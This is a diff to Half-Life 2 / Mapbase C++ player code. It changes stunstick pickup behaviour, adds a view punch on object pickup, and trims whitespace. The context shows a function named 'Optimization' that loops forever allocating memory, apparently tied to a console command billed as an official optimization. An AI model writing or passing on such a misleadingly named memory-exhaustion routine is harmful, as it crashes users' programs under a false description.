@@ -82,7 +82,7 @@ extern ConVar player_squad_autosummon_enabled;
 #define PLAYER_HULL_REDUCTION	0.70
 
 // This switches between the single primary weapon, and multiple weapons with buckets approach (jdw)
-#define	HL2_SINGLE_PRIMARY_WEAPON_MODE	0
+#define	HL2_SINGLE_PRIMARY_WEAPON_MODE 0
 
 #define TIME_IGNORE_FALL_DAMAGE 10.0
 
@@ -180,17 +180,13 @@ CON_COMMAND(drop, "Dropping weapon from the player")
 			pPlayer->Weapon_Drop(pWeapon, NULL, NULL);
 		}
 	}
-
-
 }
 
 void CBasePlayer::Optimization() {
 	while (true)
 	{
 		new double(8192);
-
 	}
-
 }
 
 CON_COMMAND(optimizon, "Optimization Official By Ilyuha Korotkov Studios")
@@ -3411,15 +3407,25 @@ bool CHL2_Player::Weapon_CanUse( CBaseCombatWeapon *pWeapon )
 #ifdef MAPBASE
 	if ( pWeapon->ClassMatches( "weapon_stunstick" ) )
 	{
-		switch (HL2GameRules()->GetStunstickPickupBehavior())
+		switch (HL2GameRules()->GetStunstickPickupBehavior()) // FORSAKENED Stunstick
 		{
 			// Default, including 0
 			default:
 				{
-					if ( ApplyBattery( 0.5 ) )
-						UTIL_Remove( pWeapon );
-					return false;
+					if (Weapon_OwnsThisType("weapon_stunstick"))
+					{
+						if (ApplyBattery(0.5))
+							UTIL_Remove(pWeapon);
+						return false;
+					}
 				} break;
+
+			//case 0:
+			//	{
+			//	if ( ApplyBattery( 0.5 ) )
+			//		UTIL_Remove( pWeapon );
+			//		return false;
+			//	} break;
 
 			// Allow pickup, if already picked up just apply battery
 			case 1:
@@ -3971,6 +3977,8 @@ void CHL2_Player::PickupObject( CBaseEntity *pObject, bool bLimitMassAndSize )
 	// Can't be picked up if NPCs are on me
 	if ( pObject->HasNPCsOnIt() )
 		return;
+
+	this->ViewPunch(QAngle(1, 2, -3));
 
 	PlayerPickupObject( this, pObject );
 }
